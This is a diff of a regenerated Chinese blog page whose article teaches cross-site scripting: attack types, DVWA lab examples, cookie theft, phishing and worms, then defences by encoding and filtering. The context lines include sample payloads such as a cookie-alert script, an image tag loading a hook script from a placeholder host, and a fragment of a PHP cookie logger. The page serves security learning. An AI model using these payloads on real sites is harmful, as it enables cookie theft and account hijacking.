@@ -15,12 +15,12 @@
 
 
 
-<meta name="description" content="XSS攻击漏洞概述XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。 XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网">
+<meta name="description" content="Web基础—XSS攻击漏洞概述XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS攻击">
+<meta property="og:title" content="web基础---XSS攻击">
 <meta property="og:url" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="KrismileBlog">
-<meta property="og:description" content="XSS攻击漏洞概述XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。 XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网">
+<meta property="og:description" content="Web基础—XSS攻击漏洞概述XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。">
 <meta property="og:locale">
 <meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/1.png">
 <meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/5.png">
@@ -48,9 +48,10 @@
 <meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/24.png">
 <meta property="og:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/javascript:alert(‘xss’)">
 <meta property="article:published_time" content="2022-04-09T07:30:39.000Z">
-<meta property="article:modified_time" content="2022-04-29T14:22:13.745Z">
+<meta property="article:modified_time" content="2022-08-12T12:04:08.583Z">
 <meta property="article:author" content="krismile">
 <meta property="article:tag" content="web基础">
+<meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/1.png">
 
@@ -86,7 +87,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>XSS攻击 | KrismileBlog</title>
+<title>web基础---XSS攻击 | KrismileBlog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -196,8 +197,6 @@
                         
                             <li><a href="/archives/">首页</a></li>
                         
-                            <li><a href="/categories/">分类</a></li>
-                        
                             <li><a href="/tags/">标签</a></li>
                         
                             <li><a href="/about/">关于我</a></li>
@@ -220,7 +219,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="tag">ctf比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ICS/" rel="tag">ICS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Phar反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="tag">ctf比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/" rel="tag">md5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80%EF%BC%8CJWT/" rel="tag">web基础，JWT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%81SQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%8F%8D%E5%BC%B9shell/" rel="tag">渗透测试、SQL注入、反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
                     </div>
                 </section>
                 
@@ -271,8 +270,6 @@
                 
                     <li><a href="/archives/">首页</a></li>
                 
-                    <li><a href="/categories/">分类</a></li>
-                
                     <li><a href="/tags/">标签</a></li>
                 
                     <li><a href="/about/">关于我</a></li>
@@ -314,7 +311,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      XSS攻击
+      web基础---XSS攻击
     </h1>
   
 
@@ -323,13 +320,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+    <a class="article-category-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%9F%BA%E7%A1%80/" rel="tag">web基础</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -339,15 +336,17 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。</p>
+        <h2 id="Web基础—XSS攻击"><a href="#Web基础—XSS攻击" class="headerlink" title="Web基础—XSS攻击"></a>Web基础—XSS攻击</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。</p>
+<span id="more"></span>
+
 <p>XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网页中，并由浏览器解释运行这段JS脚本注入的网页，以达到恶意攻击的效果。用户用最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然而浏览器不会判断代码是否恶意，即XSS的对象是用户和浏览器。</p>
 <p>XSS危害：</p>
 <blockquote>
 <p>1.窃取用户Cookie，如果用户Cookie被窃取，攻击者可以不通过密码，而直接登录用户账户<br>2.使用XMLHttpRequest构造模拟用户请求操作<br>3.XSS钓鱼攻击<br>4.用户PC信息探测收集器<br>5.XSS蠕虫攻击</p>
 </blockquote>
-<span id="more"></span>
+<!--more-->
 
-<h2 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h2><blockquote>
+<h3 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h3><blockquote>
 <p>1.弹窗警告</p>
 <p>用此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入的单引号来测试漏洞的存在，一旦此脚本能执行，意味这没有对特殊字符做过滤，因此存在XSS漏洞。</p>
 <p>常见HTML事件属性</p>
@@ -396,7 +395,7 @@
 <p><code>&lt;img src=&quot;http://xxxx/hook.js&quot;&gt;&lt;/img&gt;</code></p>
 <p>7.根据上下文进行闭合+以上脚本</p>
 </blockquote>
-<h2 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h2><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射性跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到URL地址的参数中。</p>
+<h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射性跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到URL地址的参数中。</p>
 <p>反射型XSS的利用一般是攻击者通过特定手段（如电子邮件），诱使用户去访问一个包含恶意代码的URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类XSS通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端Cookie或进行钓鱼欺骗。</p>
 <p>实验（DVWA－XSS（Reflected））：</p>
 <p><strong>弹窗警告：</strong></p>
@@ -420,7 +419,7 @@
 <h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM　XSS"></a>DOM　XSS</h4><p>这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。</p>
 <p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
 <p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/4.png"></p>
-<h2 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h2><h4 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h4><p>方法一：弹窗警告</p>
+<h3 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h3><h4 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h4><p>方法一：弹窗警告</p>
 <p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
 <p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/8.png" alt="8"></p>
 <p>方法二：</p>
@@ -488,7 +487,7 @@ file_put_contents('cookie.txt',$cookie);
 <h4 id="XSS-Worm"><a href="#XSS-Worm" class="headerlink" title="XSS Worm"></a>XSS Worm</h4><p>2005年，19岁的Samy Kamkar发起对Myspace.com的XSS的XSS Worm攻击（Web安全史上第一个重量级的XSS Worm）</p>
 <p>XSS Worm是XSS的一种终极利用方式，它的破坏性和影响力巨大，但也有一定的条件。一般来说，用户之间发生交互行为的页面，如果存在存储型XSS（注意发送站内信、用户留言等页面），则比较容易发生XSS Worm攻击。</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33605106/article/details/79756478">百度XSS Worm</a></p>
-<h2 id="XSS攻击技巧"><a href="#XSS攻击技巧" class="headerlink" title="XSS攻击技巧"></a>XSS攻击技巧</h2><ul>
+<h3 id="XSS攻击技巧"><a href="#XSS攻击技巧" class="headerlink" title="XSS攻击技巧"></a>XSS攻击技巧</h3><ul>
 <li><p>利用字符编码</p>
 <p>利用字符编码，通过这种技巧，不仅能让 XSS 代码绕过服务端的过滤，还能更好地隐藏 Shellcode；（ JS 支持 unicode、eacapes、十六进制、十进制等编码形式）</p>
 </li>
@@ -507,9 +506,9 @@ file_put_contents('cookie.txt',$cookie);
 <li><p>DOM 型的 XSS 主要是由客户端的脚本通过 DOM 动态地输出数据到页面上，它不依赖于提交数据到服务器，而是从客户端获得DOM中的数据在本地执行。容易导致 DOM 型的 XSS 的输入源包括：Document.URL、Location(.pathname|.href|.search|.hash)、Document.referrer、Window.name、Document.cookie、localStorage&#x2F;globalStorage；</p>
 </li>
 </ul>
-<h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如＜、＞、‘　、“等，如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的输入检查，可能还会匹配XSS的特征。比如”<script>“，”javascript"等敏感字符。这种输入检查的方式，可以称为“XSS Filter”</p>
+<h3 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h3><h4 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h4><p>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如＜、＞、‘　、“等，如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的输入检查，可能还会匹配XSS的特征。比如”<script>“，”javascript"等敏感字符。这种输入检查的方式，可以称为“XSS Filter”</p>
 <p>但XSS Filter进行XSS检查时，用户数据没有结合渲染页面的HTML代码，因此XSS Filter 对语境的理解并不完整；且对“<”、“>”等字符的处理，可能会改变用户数据的语义。</p>
-<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>一般来说，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击</p>
+<h4 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h4><p>一般来说，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击</p>
 <p>编码分为很多种，有针对html，javascript等的编码方式</p>
 <p>**1.**针对HTML的编码方式：HTMLEncode</p>
 <p>为了对抗XSS，要求至少转换以下字符：</p>
@@ -569,12 +568,12 @@ file_put_contents('cookie.txt',$cookie);
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">XSS攻击</a></p>
+        <p><span>本文标题:</span><a href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">web基础---XSS攻击</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
         <p><span>发布时间:</span>2022-04-09, 15:30:39</p>
-        <p><span>最后更新:</span>2022-04-29, 22:22:13</p>
+        <p><span>最后更新:</span>2022-08-12, 20:04:08</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/" title="XSS攻击">https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/</a>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/" title="web基础---XSS攻击">https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/</a>
             <span class="copy-path" data-clipboard-text="原文: https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -608,7 +607,7 @@ file_put_contents('cookie.txt',$cookie);
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0XSS%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">构造XSS脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">XSS 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">DOM　XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">XSS利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie%E7%AA%83%E5%8F%96"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Cookie窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.1.</span> <span class="toc-text">重定向钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML%E6%B3%A8%E5%85%A5%E5%BC%8F%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.2.</span> <span class="toc-text">HTML注入式钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#iframe%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.3.</span> <span class="toc-text">iframe钓鱼</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">网页挂马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-Worm"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">XSS Worm</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7"><span class="toc-number">1.5.</span> <span class="toc-text">XSS攻击技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">1.6.</span> <span class="toc-text">XSS的防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E6%A3%80%E6%9F%A5"><span class="toc-number">1.6.1.</span> <span class="toc-text">输入检查</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%9F%BA%E7%A1%80%E2%80%94XSS%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">Web基础—XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0XSS%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">构造XSS脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">XSS 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.3.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">1.3.3.</span> <span class="toc-text">DOM　XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">XSS利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie%E7%AA%83%E5%8F%96"><span class="toc-number">1.4.1.</span> <span class="toc-text">Cookie窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.2.</span> <span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.3.</span> <span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">重定向钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML%E6%B3%A8%E5%85%A5%E5%BC%8F%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">HTML注入式钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#iframe%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">iframe钓鱼</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC"><span class="toc-number">1.4.4.</span> <span class="toc-text">网页挂马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-Worm"><span class="toc-number">1.4.5.</span> <span class="toc-text">XSS Worm</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7"><span class="toc-number">1.5.</span> <span class="toc-text">XSS攻击技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">1.6.</span> <span class="toc-text">XSS的防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E6%A3%80%E6%9F%A5"><span class="toc-number">1.6.1.</span> <span class="toc-text">输入检查</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -644,7 +643,7 @@ file_put_contents('cookie.txt',$cookie);
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"XSS攻击　| KrismileBlog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"web基础---XSS攻击　| KrismileBlog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -700,7 +699,7 @@ file_put_contents('cookie.txt',$cookie);
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/">2022网刃杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/17/RCE/">RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/natas/">Natas</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">XSS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/">JWT基础知识</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/">Vulnhub渗透测试--AI-web1.0</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Phar反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/">2022网刃杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/17/RCE/">RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/natas/">Natas</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">web基础---XSS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/">JWT基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/">PHP反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">web基础---MD5（）函数的漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/18/Web%E6%B8%97%E9%80%8F/">web渗透---信息收集方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/">web基础---SQL注入</a></li></ul>
 
 
 
@@ -743,6 +742,7 @@ file_put_contents('cookie.txt',$cookie);
 </footer>
 <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
+
     </div>
     
 <script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
@@ -807,7 +807,7 @@ ga('send', 'pageview');
     
 </script>
 
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
   </div>
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
